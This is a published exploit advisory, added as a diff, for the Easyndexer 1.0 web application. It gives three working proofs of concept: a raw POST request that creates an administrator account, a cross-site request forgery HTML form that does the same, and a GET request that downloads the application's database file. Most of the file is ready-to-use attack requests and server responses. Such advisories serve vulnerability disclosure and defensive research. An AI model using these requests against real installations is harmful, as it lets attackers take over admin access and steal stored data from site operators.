@@ -1,0 +1,86 @@
+# Exploit Title: Easyndexer 1.0 - Cross-Site Request Forgery (Add Admin)
+# Dork: N/A
+# Date: 2018-11-10
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://sourceforge.net/projects/easyndexer/
+# Software Link: https://ayera.dl.sourceforge.net/project/easyndexer/easyndexer_win32.exe
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/src/createuser.php
+# 
+POST /[PATH]/src/createuser.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+username=efe&password=efe&name=OMer&surname=Efe&privileges=1
+HTTP/1.1 200 OK
+Date: Sat, 10 Nov 2018 17:12:54 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=fuiv6a0p3jnu15ggcphj624e74; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 127
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/src/createuser.php
+# 
+<html>
+<body>
+<tr>
+	<form action="http://localhost/ExploitDb/easyndexer/src/createuser.php" method="POST">
+		<td>New:</td>
+		<td><input name="username" type="text"></td>
+		<td><input name="password" type="text"></td>
+		<td><input name="name" type="text"></td>
+		<td><input name="surname" type="text"></td>
+		<td><select name="privileges">
+			<option value="1">Administrator</option>
+			<option value="2">Manager</option>
+			<option value="3">User</option>
+			<option value="4">Guest</option>
+			<option value="5">Translator</option>
+		</select></td>
+		<td><input value="Create" title="Creates a new user" type="submit"></td>
+		<td><input value="Reset" title="Reset data" type="reset"></td>
+	</form>
+</tr>
+</body>
+</html>
+
+# POC: Database File Download
+# 3)
+# http://localhost/[PATH]/databases/generaldb.db
+# 
+GET /[PATH]/databases/generaldb.db HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=fuiv6a0p3jnu15ggcphj624e74
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sat, 10 Nov 2018 17:15:04 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+Last-Modified: Sat, 10 Nov 2018 17:12:54 GMT
+Etag: "1400-57a52941eade9"
+Accept-Ranges: bytes
+Content-Length: 5120
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
